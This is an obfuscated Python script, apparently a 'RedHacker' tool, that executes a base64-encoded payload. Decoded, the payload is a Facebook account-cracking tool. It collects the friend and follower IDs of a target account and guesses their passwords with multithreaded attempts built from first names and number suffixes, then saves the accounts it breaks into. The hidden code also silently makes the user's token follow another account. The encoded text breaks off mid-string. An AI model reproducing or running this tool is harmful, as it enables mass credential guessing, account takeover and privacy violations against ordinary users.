# Tool Created By RedHacker
# Join Whatsapp : Red Hackers Army 

import base64 
exec(base64.b64decode('IyAtKi0gY29kaW5nOiB1dGYtOAojIGF1dGhvciBieSBSZWQgaGFja2VyCmltcG9ydCBvcwp0cnk6CglpbXBvcnQgcmVxdWVzdHMKZXhjZXB0IEltcG9ydEVycm9yOgoJb3Muc3lzdGVtKCJwaXAyIGluc3RhbGwgcmVxdWVzdHMiKQoKdHJ5OgoJaW1wb3J0IGJzNApleGNlcHQgSW1wb3J0RXJyb3I6Cglvcy5zeXN0ZW0oInBpcDIgaW5zdGFsbCBiczQiKQoKaW1wb3J0IG9zLCBzeXMsIHJlLCB0aW1lLCByZXF1ZXN0cywganNvbiwgcmFuZG9tLCBjYWxlbmRhcgpmcm9tIG11bHRpcHJvY2Vzc2luZy5wb29sIGltcG9ydCBUaHJlYWRQb29sCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHBhcnNlcgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlCgpDb3JyZWN0VXNlcm5hbWUgPSAiUmVkSGFja2VycyIKQ29ycmVjdFBhc3N3b3JkID0gIkFybXkiCgoKbG9vcCA9ICd0cnVlJwp3aGlsZSAobG9vcCA9PSAndHJ1ZScpOgogICAgdXNlcm5hbWUgPSByYXdfaW5wdXQoIlwwMzNbMDszOW1ceDFiWzA7MzltVXNlcm5hbWUg4p6jIFx4MWJbMDszOW0gIikKICAgIGlmICh1c2VybmFtZSA9PSBDb3JyZWN0VXNlcm5hbWUpOgogICAgCXBhc3N3b3JkID0gcmF3X2lucHV0KCJcMDMzWzA7MzltXHgxYlswOzM5bVBhc3N3b3JkIOKeoyBceDFiWzA7MzltICIpCiAgICAgICAgaWYgKHBhc3N3b3JkID09IENvcnJlY3RQYXNzd29yZCk6CiAgICAgICAgICAgIHByaW50ICJMb2dnZWQgaW4gc3VjY2Vzc2Z1bGx5IGFzICIgKyB1c2VybmFtZQogICAgICAgICAgICBsb29wID0gJ2ZhbHNlJwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50ICJXcm9uZyBQYXNzd29yZCIKICAgICAgICAgICAgb3Muc3lzdGVtKCdweXRob24yIGEnKQogICAgZWxzZToKICAgICAgICBwcmludCAiV3JvbmcgVXNlcm5hbWUiCiAgICAgICAgb3Muc3lzdGVtKCdweXRob24yIGEnKQoKbG9vcCA9IDAKaWQgPSBbXQpvayA9IFtdCmNwID0gW10KCmN0ID0gZGF0ZXRpbWUubm93KCkKbiA9IGN0Lm1vbnRoCmJ1bGFuID0gWyJKYW51YXJpIiwgIkZlYnJ1YXJpIiwgIk1hcmV0IiwgIkFwcmlsIiwgIk1laSIsICJKdW5pIiwgIkp1bGkiLCAiQWd1c3R1cyIsICJTZXB0ZW1iZXIiLCAiT2t0b2JlciIsICJOb3ZlbWJlciIsICJEZXNlbWJlciJdCnRyeToKICAgIGlmIG4gPCAwIG9yIG4gPiAxMjoKICAgICAgICBleGl0KCkKICAgIG5UZW1wID0gbiAtIDEKZXhjZXB0IFZhbHVlRXJyb3I6CiAgICBleGl0KCkKCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQp0YSA9IGN1cnJlbnQueWVhcgpidSA9IGN1cnJlbnQubW9udGgKaGEgPSBjdXJyZW50LmRheQpvcCA9IGJ1bGFuW25UZW1wXQoKCmRlZiAgamFsYW4oeik6Cglmb3IgZSBpbiB6ICsgJ1xuJzoKCQlzeXMuc3Rkb3V0LndyaXRlKGUpCgkJc3lzLnN0ZG91dC5mbHVzaCgpCgkJdGltZS5zbGVlcCgwMDAuMDUpCgpteV9kYXRlID0gZGF0ZS50b2RheSgpCmhyID0gY2FsZW5kYXIuZGF5X25hbWVbbXlfZGF0ZS53ZWVrZGF5KCldCnRCaWxhbGwgPSAoIiVzLSVzLSVzLSVzIiUoaHIsIGhhLCBvcCwgdGEpKQp0Z2wgPSAoIiVzICVzICVzIiUoaGEsIG9wLCB0YSkpCmJ1bGFuX3R0bCA9IHsiMDEiOiAiSmFudWFyaSIsICIwMiI6ICJGZWJydWFyaSIsICIwMyI6ICJNYXJldCIsICIwNCI6ICJBcHJpbCIsICIwNSI6ICJNZWkiLCAiMDYiOiAiSnVuaSIsICIwNyI6ICJKdWxpIiwgIjA4IjogIkFndXN0dXMiLCAiMDkiOiAiU2VwdGVtYmVyIiwgIjEwIjogIk9rdG9iZXIiLCAiMTEiOiAiTm92ZW1iZXIiLCAiMTIiOiAiRGVzZW1iZXIifQoKZGVmIGxvZ28oKToKCW9zLnN5c3RlbSgiY2xlYXIiKQoJcHJpbnQoIiIiXHgxYlswOzMybeKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwpceDFiWzA7MzNt4pWRV0VMQ09NRSBUTyBNeSBUT09MIElUJ1MgUkVEIEhBQ0tFUuKVkQpceDFiWzA7MzNt4pWRICAgICAgICNUT09MIEFVVEhPUiBSRUQtSEFDS0VSLuKVkQpceDFiWzA7MzNt4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdClx4MWJbMDszM20gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tClx4MWJbMDszM23ilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcKXHgxYlswOzMzbeKVkSNXRUJTSVRFICAgICA6IEZPTExPVyBNRSBPTiBHSVRIVULilZEKXHgxYlswOzMzbeKVkSNGQUNFQk9PSyA6IE5BTUUgW1JFRC1INENLRVIgXSAgICAgIOKVkQpceDFiWzA7MzNt4pWRI0dJVEhVQiA6IGh0dHBzOi8vZ2l0aHViLmNvbS9SZWRIYWNra0VyUi9SZWRIYWNra0VyUiAg4pWRClx4MWJbMDszM23ilZEjV0hBVFNBUFAgOiBSRUQgSDRDS0VScyBBUk1ZICAgICAgICAgIOKVkQpceDFiWzA7MzNt4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIiIiKQpkZWYgbG9naW4oKToKCW9zLnN5c3RlbSgiY2xlYXIiKQoJdHJ5OgoJCSMtPiBjb25uZWN0aW9uIHRlc3QKCQlyZXF1ZXN0cy5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJZXhpdCgiSW50ZXJuZXQgQ29ubmVjdGlvbiBFcnJvciIpCgl0cnk6CgkJdG9rZW4gPSBvcGVuKCJsb2dpbi50eHQiLCAiciIpCgkJbWVudSgpCglleGNlcHQgS2V5RXJyb3IsIElPRXJyb3I6CgkJdG9rZW4gPSByYXdfaW5wdXQoIls/XSBFbnRlciBUb2tlbiA6ICIpCgkJaWYgdG9rZW4gPT0gIiI6CgkJCXByaW50KCJXcm9uZyBJbnB1dCIpCgkJdHJ5OgoJCQluYW1hID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49Iit0b2tlbikuanNvbigpWyJuYW1lIl0ubG93ZXIoKQoJCQlvcGVuKCJsb2dpbi50eHQiLCAidyIpLndyaXRlKHRva2VuKQoJCQkjLT4gYm90IGZvbGxvdwoJCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS80L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKSAgICAgICMgS0FTSE1JUkkgSEFDS0VSCgkJCW1lbnUoKQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJb3Muc3lzdGVtKCJybSAtZiBsb2dpbi50eHQiKQoJCQlleGl0KCJbP10gTG9naW4gRXJyb3IiKQoKZGVmIG1lbnUoKToKCW9zLnN5c3RlbSgiY2xlYXIiKQoJZ2xvYmFsIHRva2VuCgl0cnk6CgkJdG9rZW4gPSBvcGVuKCJsb2dpbi50eHQiLCJyIikucmVhZCgpCglleGNlcHQgS2V5RXJyb3I6CgkJb3Muc3lzdGVtKCJybSAtZiBsb2dpbi50eHQiKQoJCWV4aXQoIls/XSBMb2dpbiBFcnJvciIpCgl0cnk6CgkJbmFtYSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvP2FjY2Vzc190b2tlbj0iK3Rva2VuKS5qc29uKClbIm5hbWUiXS5sb3dlcigpCglleGNlcHQgSU9FcnJvcjoKCQlvcy5zeXN0ZW0oInJtIC1mIGxvZ2luLnR4dCIpCgkJZXhpdCgiXDAzM1sxOzk2bVtcMDMzWzE7OTNtK1wwMzNbMTs5Nm1dIFRva2VuIEVycm9yIikKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlleGl0KCIgISBubyBpbnRlcm5ldCBjb25uZWN0aW9uIikKCWxvZ28oKQoJCglwcmludCgiXG5cMDMzWzE7OTNtW1wwMzNbMTs5NG0wMVwwMzNbMTs5N21dIENSQUNLIElEIEZST00gUFVCTElDIEZSSUVORFMiKQoJcHJpbnQoIlwwMzNbMTs5M21bXDAzM1sxOzk0bTAyXDAzM1sxOzk3bV0gQ1JBQ0sgSUQgRlJPTSBQVUJMSUNLIEZPTExPV0VSUyIpCglwcmludCgiXDAzM1sxOzkzbVtcMDMzWzE7OTRtMDNcMDMzWzE7OTdtXSBNVUxUSVBMRS1JRCdzIENSQUNLXDAzM1sxOzkzbSBbIFwwMzNbMTs5NW1QUk8gXDAzM1sxOzk3bV0iKQoJcHJpbnQoIlwwMzNbMTs5M21bXDAzM1sxOzk0bTA0XDAzM1sxOzk3bV0gQ2hlY2sgQ3JhY2sgUmVzdWx0cyIpCglwcmludCgiXDAzM1sxOzkzbVtcMDMzWzE7OTRtMDVcMDMzWzE7OTdtXSBVU0VSLUFHRU5UIFNFVFRJTkdTXDAzM1sxOzk3bSBbIFwwMzNbMTs5NW1QUk8gXDAzM1sxOzk3bV0iKQoJcHJpbnQoIlwwMzNbMTs5M21bXDAzM1sxOzk0bTAwXDAzM1sxOzk3bV0gRXhpdFwwMzNbMTs5N20gWyBcMDMzWzE7OTFtREVMRVRFIFRPS0VOIFwwMzNbMTs5N21dIikKCUJpbGFsID0gcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzkzbStcMDMzWzE7OTZtXSBDSE9PU0UgOiAiKQoJaWYgQmlsYWwgPT0iIjoKCQltZW51KCkKCWVsaWYgQmlsYWwgPT0gIjEiIG9yIEJpbGFsID09ICIwMSI6CgkJcHVibGlrKCkKCQltZXRob2QoKQoJZWxpZiBCaWxhbCA9PSAiMiIgb3IgQmlsYWwgPT0gIjAyIjoKCQlmb2xsb3dlcigpCgkJbWV0aG9kKCkKCWVsaWYgQmlsYWwgPT0gIjMiIG9yIEJpbGFsID09ICIwMyI6CgkJbWFzc2FsKCkKCQltZXRob2QoKQoJZWxpZiBCaWxhbCA9PSAiNCIgb3IgQmlsYWwgPT0gIjA0IjoKCQlwcmludCgiXG5cMDMzWzE7OTJtW1wwMzNbMTs5M20wMVwwMzNbMTs5Nm1dIENIRUNLIENSQUNLIFJFU1VMVFMgT0siKQoJCXByaW50KCJcMDMzWzE7OTNtW1wwMzNbMTs5NG0wMlwwMzNbMTs5Nm1dIENIRUNLIFJFU1VMVFMgQ1AiKQoJCWNlayA9IHJhd19pbnB1dCgiXG5cMDMzWzE7OTNtW1wwMzNbMTs5M20rXDAzM1sxOzk2bV0gQ0hPT1NFIDogIikKCQlpZiBjZWsgPT0iIjoKCQkJbWVudSgpCgkJZWxpZiBjZWsgPT0gIjEiOgoJCQlkaXJzID0gb3MubGlzdGRpcigiT0siKQoJCQlwcmludCgiXDAzM1sxOzk2bVtcMDMzWzE7OTNtK1wwMzNbMTs5Nm1dIENvcHkgRmlsZSBOYW1lICBBbmQgUGFzdCBpbnRvIElucHV0IikKCQkJZm9yIGZpbGUgaW4gZGlyczoKCQkJCXByaW50KCJb4oCiXSAgIitmaWxlKQoJCQl0cnk6CgkJCQlmaWxlID0gcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzkzbStcMDMzWzE7OTZtXSBGaWxlIE5hbWUgOiAiKQoJCQkJaWYgZmlsZSA9PSAiIjoKCQkJCQltZW51KCkKCQkJCVRvdGFsb2sgPSBvcGVuKCJPSy8lcyIlKGZpbGUpKS5yZWFkKCkuc3BsaXRsaW5lcygpCgkJCWV4Y2VwdCBJT0Vycm9yOgoJCQkJZXhpdCgiICEgZmlsZSAlcyB0aWRhayB0ZXJzZWRpYSIlKGZpbGUpKQoJCQlubV9maWxlID0gKCIlcyIlKGZpbGUpKS5yZXBsYWNlKCItIiwgIiAiKQoJCQlkZWxfdHh0ID0gbm1fZmlsZS5yZXBsYWNlKCIudHh0IiwgIiIpCgkJCXByaW50KCIgIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIikKCQkJcHJpbnQoIiBDcmFjayBSZXN1bHRlIDogJXMgVG90YWwgOiAlc1wwMzNbMDs5Mm0iJShkZWxfdHh0LCBsZW4oVG90YWxvaykpKQoJCQlvcy5zeXN0ZW0oImNhdCBPSy8lcyIlKGZpbGUpKQoJCQlwcmludCgiIFwwMzNbMDs5NG0gIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIikKCQkJZXhpdCgiICIpCgkJZWxpZiBjZWsgPT0gIjIiOgoJCQlkaXJzID0gb3MubGlzdGRpcigiQ1AiKQoJCQlwcmludCgiXDAzM1sxOzk2bVtcMDMzWzE7OTNtK1wwMzNbMTs5Nm1dIENvcHkgRmlsZSBOYW1lIEFuZCBQYXN0IGludG8gSW5wdXQiKQoJCQlmb3IgZmlsZSBpbiBkaXJzOgoJCQkJcHJpbnQoIiArICIrZmlsZSkKCQkJdHJ5OgoJCQkJZmlsZSA9IHJhd19pbnB1dCgiXG5cMDMzWzE7OTZtW1wwMzNbMTs5M20rXDAzM1sxOzk2bV0gRmlsZSBOYW1lIDogIikKCQkJCWlmIGZpbGUgPT0gIiI6CgkJCQkJbWVudSgpCgkJCQlUb3RhbGNwID0gb3BlbigiQ1AvJXMiJShmaWxlKSkucmVhZCgpLnNwbGl0bGluZXMoKQoJCQlleGNlcHQgSU9FcnJvcjoKCQkJCWV4aXQoIiAhIGZpbGUgJXMgdGlkYWsgdGVyc2VkaWEiJShmaWxlKSkKCQkJbm1fZmlsZSA9ICgiJXMiJShmaWxlKSkucmVwbGFjZSgiLSIsICIgIikKCQkJZGVsX3R4dCA9IG5tX2ZpbGUucmVwbGFjZSgiLnR4dCIsICIiKQoJCQlwcmludCgiIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIikKCQkJcHJpbnQoIiBDUkFDSyBSRVNVTFRTIDogJXMgVE9UQUwgOiAlc1wwMzNbMDs5M20iJShkZWxfdHh0LCBsZW4oVG90YWxjcCkpKQoJCQlvcy5zeXN0ZW0oImNhdCBDUC8lcyIlKGZpbGUpKQoJCQlwcmludCgiXDAzM1swOzk2bSAjIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKQoJCQlleGl0KCIgIikKCQllbHNlOgoJCQltZW51KCkKCWVsaWYgQmlsYWwgPT0gIjUiIG9yIEJpbGFsID09ICIwNSI6CgkJc2V0dGluZ191YSgpCgllbGlmIEJpbGFsID09ICIwIiBvciBCaWxhbCA9PSAiMDAiOgoJCW9zLnN5c3RlbSgicm0gLWYgbG9naW4udHh0IikKCQlleGl0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzkzbSFcMDMzWzE7OTZtXSBUb2tlbiBSZW1vdmVkIikKCWVsc2U6CgkJbWVudSgpCgpkZWYgcHVibGlrKCk6CglnbG9iYWwgdG9rZW4KCXRyeToKCQl0b2tlbiA9IG9wZW4oImxvZ2luLnR4dCIsICJyIikucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlleGl0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzkzbSFcMDMzWzE7OTZtXSBUb2tlbiBFcnJvciIpCglpZHQgPSByYXdfaW5wdXQoIlxuXDAzM1sxOzk2bVtcMDMzWzE7OTRtK1wwMzNbMTs5Nm1dIFRhcmdldCBJZDogIikKCXRyeToKCQlmb3IgaSBpbiByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSVzIiUoaWR0LCB0b2tlbikpLmpzb24oKVsiZGF0YSJdOgoJCQl1aWQgPSBpWyJpZCJdCgkJCW5hbWEgPSBpWyJuYW1lIl0ucnNwbGl0KCIgIilbMF0KCQkJaWQuYXBwZW5kKHVpZCsiPD0+IituYW1hKQoJZXhjZXB0IEtleUVycm9yOgoJCWV4aXQoIlxuXDAzM1sxOzk2bVtcMDMzWzE7OTRtK1wwMzNbMTs5Nm1dIEFjY291bnQgRnJpZW5kIExpc3QgaXMgTm90IFB1YmxpYyIpCglwcmludCgiXDAzM1sxOzk2bVtcMDMzWzE7OTRtK1wwMzNbMTs5Nm1dIFRvdGFsIGlkICA6IFwwMzNbMDs5MW0lc1wwMzNbMDs5N20iJShsZW4oaWQpKSkgCgpkZWYgZm9sbG93ZXIoKToKCWdsb2JhbCB0b2tlbgoJdHJ5OgoJCXRva2VuID0gb3BlbigibG9naW4udHh0IiwgInIiKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCWV4aXQoIlxuXDAzM1sxOzk2bVtcMDMzWzE7OTRtK1wwMzNbMTs5Nm1dIFRva2VuIEVycm9yIikKCWlkdCA9IHJhd19pbnB1dCgiXG5cMDMzWzE7OTZtW1wwMzNbMTs5NG0rXDAzM1sxOzk2bV0gVEFSR0VUIElEIDogIikKCXRyeToKCQlmb3IgaSBpbiByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL3N1YnNjcmliZXJzP2xpbWl0PTUwMDAmYWNjZXNzX3Rva2VuPSVzIiUoaWR0LCB0b2tlbikpLmpzb24oKVsiZGF0YSJdOgoJCQl1aWQgPSBpWyJpZCJdCgkJCW5hbWEgPSBpWyJuYW1lIl0ucnNwbGl0KCIgIilbMF0KCQkJaWQuYXBwZW5kKHVpZCsiPD0+IituYW1hKQoJZXhjZXB0IEtleUVycm9yOgoJCWV4aXQoIlVSTCBFcnJvciIpCglwcmludCgiWz9dIFRvdGFsIGlkICA6IFwwMzNbMDs5Mm0lc1wwMzNbMDs5Nm0iJShsZW4oaWQpKSkgCgpkZWYgbWFzc2FsKCk6CglnbG9iYWwgdG9rZW4KCXRyeToKCQl0b2tlbiA9IG9wZW4oImxvZ2luLnR4dCIsICJyIikucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlleGl0KCJcMDMzWzE7OTZtW1wwMzNbMTs5NG0rXDAzM1sxOzk2bV0gVG9rZW4gRXJyb3IiKQoJdHJ5OgoJCXRhbnlhX1RvdGFsID0gaW50KGlucHV0KCJcMDMzWzE7OTZtW1wwMzNbMTs5NG0rXDAzM1sxOzk2bV0gRU5URVIgT1BUSU9OIElEJ1MgW0hPVyBNQU5ZXSA6ICIpKQoJZXhjZXB0OnRhbnlhX1RvdGFsPTEKCWZvciB0IGluIHJhbmdlKHRhbnlhX1RvdGFsKToKCQl0ICs9MQoJCWlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzk2bVtcMDMzWzE7OTRtK1wwMzNbMTs5N21dIFRBUkdFVCBJRCAlcyA6ICIlKHQpKQoJCXRyeToKCQkJZm9yIGkgaW4gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy9mcmllbmRzP2FjY2Vzc190b2tlbj0lcyIlKGlkdCwgdG9rZW4pKS5qc29uKClbImRhdGEiXToKCQkJCXVpZCA9IGlbImlkIl0KCQkJCW5hbWEgPSBpWyJuYW1lIl0ucnNwbGl0KCIgIilbMF0KCQkJCWlkLmFwcGVuZCh1aWQrIjw9PiIrbmFtYSkKCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50KCJcMDMzWzE7OTZtW1wwMzNbMTs5NG0rXDAzM1sxOzk3bV0gSWRzIEZyaWVuZCBsaXN0IElzIE5vdCBQdWJsaWMiKQoJcHJpbnQoIlwwMzNbMTs5Nm1bXDAzM1sxOzk0bT9cMDMzWzE7OTdtXSBUb3RhbCBpZCAgOiBcMDMzWzA7OTJtJXNcMDMzWzA7OTZtIiUobGVuKGlkKSkpCgpkZWYgbWV0aG9kKCk6CglwcmludCgiXG5cMDMzWzE7OTNtW1wwMzNbMTs5NG0/XDAzM1sxOzk3bV0gQ0hPT1NFIENSQUNLSU5HIE1FVEhPRCIpCglwcmludCgiXDAzM1sxOzkzbVtcMDMzWzE7OTRtMVwwMzNbMTs5N21dIEItQVBJXDAzM1sxOzk3bSBbIFwwMzNbMTs5NW1SZUQgUFJPL0ZBU1RFUiBcMDMzWzE7OTdtXSIpCglwcmludCgiXDAzM1sxOzkzbVtcMDMzWzE7OTRtMlwwMzNbMTs5N21dIE1CQVNJQ1wwMzNbMTs5M20gWyBcMDMzWzE7OTVtRkFTVCBcMDMzWzE7OTdtXSIpCglwcmludCgiXDAzM1sxOzkzbVtcMDMzWzE7OTRtM1wwMzNbMTs5N21dIEZSRUUgRkFDRUJPT0tcMDMzWzE7OTNtIFsgXDAzM1sxOzk1bU5PUk1BTFwwMzNbMTs5N21dIikKCW1ldGhvZCA9IHJhd19pbnB1dCgiXDAzM1sxOzkzbVtcMDMzWzE7OTRtP1wwMzNbMTs5N21dIENIT09TRSA6ICIpCglpZiBtZXRob2QgPT0gIiI6CgkJbWVudSgpCgllbGlmIG1ldGhvZCA9PSAiMSI6CgkJYXNrID0gcmF3X2lucHV0KCJcMDMzWzE7OTZtW1wwMzNbMTs5NG0hXDAzM1sxOzk3bV0gRE8gWU9VIENIT09TRSBNQU5VQUwgUEFTU1dPUkQgeS90XDAzM1sxOzk3bSBbIFwwMzNbMTs5Nm1EZWZhdWx0IDogdCBcMDMzWzE7OTdtXSA6ICIpCgkJaWYgYXNrID09ICJ5IjoKCQkJbWFudWFsKCkKCQlwcmludCgiICIpCgkJVGhyZWFkUG9vbCgzMCkubWFwKGJhcGksIGlkKQoJCWV4aXQoIlByb2dyYW0gRW5kIikKCWVsaWYgbWV0aG9kID09ICIyIjoKCQlhc2sgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bXDAzM1sxOzk0bTAzXDAzM1sxOzk3bV0gRE8gWU9VIENIT09TRSBNQU5VQUwgUEFTU1dPUkQgeS90XDAzM1sxOzk3bSBbIFwwMzNbMTs5Nm1EZWZhdWx0IDogdCBcMDMzWzE7OTdtXSAiKQoJCWlmIGFzayA9PSAieSI6CgkJCW1hbnVhbCgpCgkJcHJpbnQoIiAiKQoJCVRocmVhZFBvb2woMzApLm1hcChtYmFzaWMsIGlkKQoJCWV4aXQoIlByb2dyYW0gRW5kIikKCWVsaWYgbWV0aG9kID09ICIzIjoKCQlhc2sgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bXDAzM1sxOzk0bSFcMDMzWzE7OTdtXSBETyBZT1UgQ0hPT1NFIE1BTlVBTCBQQVNTV09SRCB5L3RcMDMzWzE7OTdtIFsgXDAzM1sxOzk2bURlZmF1bHQgOiB0IFwwMzNbMTs5N21dICIpCgkJaWYgYXNrID09ICJ5IjoKCQkJbWFudWFsKCkKCQlwcmludCgiICIpCgkJVGhyZWFkUG9vbCgzMCkubWFwKG1vYmlsZSwgaWQpCgkJZXhpdCgiUHJvZ3JhbSBFbmQiKQoJZWxzZToKCQltZW51KCkKCmRlZiBjZWtfdHRsX2NwKHVpZCwgcHcpOgoJdHJ5OgoJCXRva2VuID0gb3BlbigibG9naW4udHh0IiwgInIiKS5yZWFkKCkKCQl3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzZXM6CgkJCXR0bCA9IHNlcy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyIlKHVpZCwgdG9rZW4pKS5qc29uKClbImJpcnRoZGF5Il0KCQkJbW9udGgsIGRheSwgeWVhciA9IHR0bC5zcGxpdCgiLyIpCgkJCW1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQoJCQlwcmludCgiXHJcMDMzWzA7OTVtW1JFRC1DUF0gJXN8JXN8JXMgJXMgJXNcMDMzWzA7OTFtIiUodWlkLCBwdywgZGF5LCBtb250aCwgeWVhcikpCgkJCWNwLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkKCQkJb3BlbigiQ1AvJXMudHh0IiUodGFuZ2dhbCksImEiKS53cml0ZSgiICsgJXN8JXN8JXMgJXMgJXNcbiIlKHVpZCwgcHcsIGRheSwgbW9udGgsIHllYXIpKQoJZXhjZXB0IEtleUVycm9yLCBJT0Vycm9yOgoJCWRheSA9ICgiICIpCgkJbW9udGggPSAoIiAiKQoJCXllYXIgPSAoIiAiKQoJZXhjZXB0OnBhc3MKCmRlZiBiYXBpKHVzZXIpOgoJdHJ5OgoJCXVhID0gb3BlbigiLnVhIiwgInIiKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXVhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSIpCglnbG9iYWwgbG9vcCwgdG9rZW4KCXN5cy5zdGRvdXQud3JpdGUoCgkJIlxyXDAzM1swOzkxbVtcMDMzWzA7OTJtQ3JhY2tpbmdcMDMzWzA7OTFtXVwwMzNbMDs5Mm0gJXMvJXMgLT4gT0s6LSVzIC0gQ1A6LSVzICIlKGxvb3AsIGxlbihpZCksIGxlbihvayksIGxlbihjcCkpCgkpOyBzeXMuc3Rkb3V0LmZsdXNoKCkKCXVpZCwgbmFtZSA9IHVzZXIuc3BsaXQoIjw9PiIpCglpZiBsZW4obmFtZSk+PTY6CgkJcHd4ID0gWyBuYW1lLCBuYW1lKyIxMjMiLCBuYW1lKyIxMjM0IiwgbmFtZSsiMTIzNDUiIF0KCWVsaWYgbGVuKG5hbWUpPD0yOgoJCXB3eCA9IFsgbmFtZSsiMTIzIiwgbmFtZSsiMTIzNCIsIG5hbWUrIjEyMzQ1IiBdCgllbGlmIGxlbihuYW1lKTw9MzoKCQlwd3ggPSBbIG5hbWUrIjEyMyIsIG5hbWUrIjEyMzQ1IiBdCgllbHNlOgoJCXB3eCA9IFsgbmFtZSsiMTIzIiwgbmFtZSsiMTIzNDUiIF0KCXRyeToKCQlmb3IgcHcgaW4gcHd4OgoJCQlwdyA9IHB3Lmxvd2VyKCkKCQkJc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpCgkJCWhlYWRlcnNfID0geyJ4LWZiLWNvbm5lY3Rpb24tYmFuZHdpZHRoIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwMDAwLjAsIDMwMDAwMDAwLjApKSwgIngtZmItc2ltLWhuaSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCwgNDAwMDApKSwgIngtZmItbmV0LWhuaSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCwgNDAwMDApKSwgIngtZmItY29ubmVjdGlvbi1xdWFsaXR5IjogIkVYQ0VMTEVOVCIsICJ4LWZiLWNvbm5lY3Rpb24tdHlwZSI6ICJjZWxsLkNUUmFkaW9BY2Nlc3NUZWNobm9sb2d5SFNEUEEiLCAidXNlci1hZ2VudCI6IHVhLCAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsICJ